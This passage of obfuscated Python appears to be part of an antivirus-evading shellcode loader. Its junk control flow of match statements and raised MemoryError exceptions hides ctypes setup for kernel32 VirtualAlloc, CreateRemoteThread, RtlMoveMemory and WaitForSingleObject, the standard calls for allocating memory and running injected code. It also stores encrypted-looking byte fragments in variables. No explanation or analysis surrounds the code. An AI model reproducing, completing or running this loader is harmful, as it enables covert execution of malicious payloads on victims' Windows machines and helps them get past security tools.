        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742711]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742704, 16742706]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1714: _1714 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _23 = [[(lambda : (lambda _164: _164 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _197: _197 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742709, 16742704, 16742711]))))())())()])
        raise MemoryError([(lambda : (lambda _96: _96 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _54:
        __8121457015207 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '192' == '919':
        case True:
            raise MemoryError([True])
        case False:
            _818 = [[True], [False]]
            R_E_D__A_V______(['_113'])
    raise MemoryError([True])
except MemoryError as _92:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742707, 16742704, 16742708]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742706]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _612: _612 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _112 = [[(lambda : (lambda _32: _32 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _115: _115 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742707, 16742705]))))())())()])
        raise MemoryError([(lambda : (lambda _712: _712 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1114:
        try:
            raise MemoryError(__8121457015207)
        except MemoryError as __4653648144447:
            if __4653648144447.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.VirtualAlloc.restype = wt.LPVOID
            if __4653648144447.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __5835209927732 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xa9\x0c\x18\t\x1a\x13'))()
try:
    match '187' == '198':
        case True:
            raise MemoryError([True])
        case False:
            _183 = [[True], [False]]
            R_E_D__A_V______(['_712'])
    raise MemoryError([True])
except MemoryError as _1019:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742710]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742704, 16742709]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _64: _64 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1411 = [[(lambda : (lambda _115: _115 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _155: _155 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742711, 16742704, 16742712]))))())())()])
        raise MemoryError([(lambda : (lambda _23: _23 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1916:
        __8194612288952 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '163' == '119':
        case True:
            raise MemoryError([True])
        case False:
            _51 = [[True], [False]]
            R_E_D__A_V______(['_318'])
    raise MemoryError([True])
except MemoryError as _106:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742704, 16742707]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742709, 16742712]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1215: _1215 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1012 = [[(lambda : (lambda _116: _116 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _136: _136 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742712, 16742704, 16742703]))))())())()])
        raise MemoryError([(lambda : (lambda _23: _23 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _163:
        __8194612288952 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '1510' == '815':
        case True:
            raise MemoryError([True])
        case False:
            _162 = [[True], [False]]
            R_E_D__A_V______(['_814'])
    raise MemoryError([True])
except MemoryError as _121:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742704, 16742705]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1719: _1719 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _218 = [[(lambda : (lambda _1512: _1512 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _191: _191 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742704, 16742709]))))())())()])
        raise MemoryError([(lambda : (lambda _37: _37 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1415:
        try:
            raise MemoryError(__8194612288952)
        except MemoryError as __8177331261236:
            if __8177331261236.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.CreateRemoteThread.argtypes = (wt.HANDLE, wt.LPVOID, ctypes.c_size_t, wt.LPVOID, wt.LPVOID, wt.DWORD, wt.LPVOID)
            if __8177331261236.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __3503937198796 = (lambda : R_E_D__A_V(b'R_E_D__A_V__4\xb7y\x18`\xab'))()
try:
    match '118' == '195':
        case True:
            raise MemoryError([True])
        case False:
            _39 = [[True], [False]]
            R_E_D__A_V______(['_24'])
    raise MemoryError([True])
except MemoryError as _139:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742704]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742705]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _152: _152 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _81 = [[(lambda : (lambda _129: _129 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _184: _184 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742706, 16742704, 16742703]))))())())()])
        raise MemoryError([(lambda : (lambda _110: _110 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1711:
        __4290950962101 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '816' == '112':
        case True:
            raise MemoryError([True])
        case False:
            _95 = [[True], [False]]
            R_E_D__A_V______(['_71'])
    raise MemoryError([True])
except MemoryError as _910:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742704, 16742710]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742709]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _126: _126 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _81 = [[(lambda : (lambda _192: _192 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _157: _157 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742710, 16742706]))))())())()])
        raise MemoryError([(lambda : (lambda _1710: _1710 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1119:
        __4290950962101 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '141' == '52':
        case True:
            raise MemoryError([True])
        case False:
            _76 = [[True], [False]]
            R_E_D__A_V______(['_1914'])
    raise MemoryError([True])
except MemoryError as _313:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742704, 16742707]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742704, 16742706]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _178: _178 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _147 = [[(lambda : (lambda _182: _182 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1214: _1214 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742704, 16742703]))))())())()])
        raise MemoryError([(lambda : (lambda _1213: _1213 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _176:
        try:
            raise MemoryError(__4290950962101)
        except MemoryError as __7848481649258:
            if __7848481649258.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.CreateRemoteThread.restype = wt.HANDLE
            if __7848481649258.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __3623591673981 = (lambda : R_E_D__A_V(b'R_E_D__A_V__,\xa1?\xee\x01k'))()
            if __7848481649258.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __7193094432865 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\x80\xb18\xf8l\x1d'))()
            if __7848481649258.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __4939116818242 = (lambda : R_E_D__A_V(b'R_E_D__A_V__10\xe8\xf0\x10\x8e'))()
            if __7848481649258.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x06'))():
                __3977474683740 = (lambda : R_E_D__A_V(b'R_E_D__A_V__!\xf6?\x05\xfb\xb9'))()
            if __7848481649258.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x07'))():
                __4460820436710 = (lambda : R_E_D__A_V(b'R_E_D__A_V__dh\x83h+e'))()
try:
    match '14' == '95':
        case True:
            raise MemoryError([True])
        case False:
            _1119 = [[True], [False]]
            R_E_D__A_V______(['_153'])
    raise MemoryError([True])
except MemoryError as _35:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742705]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742704, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _97: _97 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1210 = [[(lambda : (lambda _1215: _1215 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _710: _710 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742709, 16742704, 16742708]))))())())()])
        raise MemoryError([(lambda : (lambda _176: _176 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1815:
        __7870399406090 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '317' == '34':
        case True:
            raise MemoryError([True])
        case False:
            _716 = [[True], [False]]
            R_E_D__A_V______(['_118'])
    raise MemoryError([True])
except MemoryError as _710:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742708, 16742707]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742711]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _101: _101 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1310 = [[(lambda : (lambda _106: _106 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _28: _28 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742707, 16742710]))))())())()])
        raise MemoryError([(lambda : (lambda _19: _19 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _81:
        __7870399406090 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '615' == '161':
        case True:
            raise MemoryError([True])
        case False:
            _64 = [[True], [False]]
            R_E_D__A_V______(['_53'])
    raise MemoryError([True])
except MemoryError as _413:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742707]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742710]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1417: _1417 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1510 = [[(lambda : (lambda _193: _193 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1016: _1016 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742710, 16742704, 16742710]))))())())()])
        raise MemoryError([(lambda : (lambda _1210: _1210 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _72:
        try:
            raise MemoryError(__7870399406090)
        except MemoryError as __7486968265056:
            if __7486968265056.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.RtlMoveMemory.argtypes = (wt.LPVOID, wt.LPVOID, ctypes.c_size_t)
            if __7486968265056.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __3231932645748 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\x16\xb6\x0b\xef\x9c\xa8'))()
            if __7486968265056.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __3694325844360 = (lambda : R_E_D__A_V(b'R_E_D__A_V__"\xed\x9a[\x933'))()
try:
    match '415' == '818':
        case True:
            raise MemoryError([True])
        case False:
            _1317 = [[True], [False]]
            R_E_D__A_V______(['_1218'])
    raise MemoryError([True])
except MemoryError as _71:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742710]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742704, 16742708]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _714: _714 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _814 = [[(lambda : (lambda _1812: _1812 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1413: _1413 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742706, 16742704, 16742711]))))())())()])
        raise MemoryError([(lambda : (lambda _1913: _1913 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _178:
        __4821048942343 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '1413' == '712':
        case True:
            raise MemoryError([True])
        case False:
            _169 = [[True], [False]]
            R_E_D__A_V______(['_612'])
    raise MemoryError([True])
except MemoryError as _163:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742708]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _16: _16 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _127 = [[(lambda : (lambda _515: _515 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1510: _1510 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742712, 16742704, 16742703]))))())())()])
        raise MemoryError([(lambda : (lambda _415: _415 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _26:
        __4821048942343 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '313' == '36':
        case True:
            raise MemoryError([True])
        case False:
            _193 = [[True], [False]]
            R_E_D__A_V______(['_154'])
    raise MemoryError([True])
except MemoryError as _116:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742709]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742704, 16742710]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1819: _1819 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _18 = [[(lambda : (lambda _719: _719 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1512: _1512 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742705, 16742704, 16742707]))))())())()])
        raise MemoryError([(lambda : (lambda _133: _133 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _312:
        try:
            raise MemoryError(__4821048942343)
        except MemoryError as __7173251309690:
            if __7173251309690.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.RtlMoveMemory.restype = None
            if __7173251309690.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __6095268717095 = (lambda : R_E_D__A_V(b'R_E_D__A_V__^\xf7q\x08F\xb6'))()
try:
    match '813' == '125':
        case True:
            raise MemoryError([True])
        case False:
            _613 = [[True], [False]]
            R_E_D__A_V______(['_1713'])
    raise MemoryError([True])
except MemoryError as _715:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742704, 16742711]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742705]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _56: _56 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1219 = [[(lambda : (lambda _712: _712 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _67: _67 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742710, 16742704, 16742709]))))())())()])
        raise MemoryError([(lambda : (lambda _1912: _1912 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1115:
        __3512605188125 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '312' == '1913':
        case True:
            raise MemoryError([True])
        case False:
            _92 = [[True], [False]]
            R_E_D__A_V______(['_91'])
    raise MemoryError([True])
except MemoryError as _110:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742709, 16742708]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742711]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _133: _133 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _137 = [[(lambda : (lambda _612: _612 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _514: _514 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742703, 16742712]))))())())()])
        raise MemoryError([(lambda : (lambda _1817: _1817 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _166:
        __3512605188125 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '149' == '1614':
        case True:
            raise MemoryError([True])
        case False:
            _1712 = [[True], [False]]
            R_E_D__A_V______(['_212'])
    raise MemoryError([True])
except MemoryError as _714:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742707]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742711]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1012: _1012 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _96 = [[(lambda : (lambda _157: _157 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _106: _106 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742711, 16742704, 16742705]))))())())()])
        raise MemoryError([(lambda : (lambda _106: _106 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _105:
        try:
            raise MemoryError(__3512605188125)
        except MemoryError as __7449635859882:
            if __7449635859882.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.WaitForSingleObject.argtypes = (wt.HANDLE, wt.DWORD)
            if __7449635859882.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __6905928933503 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xe9\xee\x89$\xc1\x0b'))()
            if __7449635859882.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __7213694169324 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xfb\xbaR(C9'))()
            if __7449635859882.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __5703566776769 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xdbb\x93\x1d\xc3L'))()
try:
    match '26' == '1516':
        case True:
            raise MemoryError([True])
        case False:
            _1417 = [[True], [False]]
            R_E_D__A_V______(['_124'])
    raise MemoryError([True])
except MemoryError as _1911:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742706]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742704, 16742712]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _181: _181 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1218 = [[(lambda : (lambda _188: _188 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _514: _514 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742705, 16742704, 16742707]))))())())()])
        raise MemoryError([(lambda : (lambda _617: _617 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _24:
        __2209740698865 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '1217' == '26':
        case True:
            raise MemoryError([True])
        case False:
            _17 = [[True], [False]]
            R_E_D__A_V______(['_1517'])
    raise MemoryError([True])
except MemoryError as _166:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742710]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742704, 16742703]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1718: _1718 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _319 = [[(lambda : (lambda _94: _94 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _62: _62 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742705, 16742707]))))())())()])
        raise MemoryError([(lambda : (lambda _410: _410 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _49:
        __2209740698865 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '1214' == '89':
        case True:
            raise MemoryError([True])
        case False:
            _162 = [[True], [False]]
            R_E_D__A_V______(['_29'])
